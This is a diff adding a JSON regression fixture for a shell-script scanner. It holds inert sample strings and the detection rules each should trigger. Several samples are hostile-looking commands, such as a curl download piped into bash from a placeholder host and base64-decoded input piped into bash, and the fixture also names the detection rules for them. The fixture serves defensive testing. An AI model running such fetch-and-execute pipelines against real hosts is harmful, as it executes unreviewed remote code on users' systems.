@@ -1,0 +1,12 @@
+{
+  "schema_version": 1,
+  "provenance": "Synthetic inert strings authored for scanner regression; never execute these samples. Expected matches document heuristic limitations rather than proving safety.",
+  "samples": [
+    {"id": "nested-download", "content": "#!/bin/sh\ncurl https://example.test/artifact -o artifact\n", "expected_rules": []},
+    {"id": "documentation", "content": "Documentation: fetch a script, inspect it, then run it manually.\n", "expected_rules": []},
+    {"id": "encoded-data", "content": "printf abc | base64 -d > decoded.data\n", "expected_rules": []},
+    {"id": "encoded-execution", "content": "echo abc | base64 -d | bash\n", "expected_rules": ["base64_encoded_shell"]},
+    {"id": "nested-pipe", "content": "curl https://example.test/installer | bash\n", "expected_rules": ["suspicious_pipe_bash"]},
+    {"id": "quoted-command", "content": "echo 'curl https://example.test/installer | bash'\n", "expected_rules": ["suspicious_pipe_bash"]}
+  ]
+}
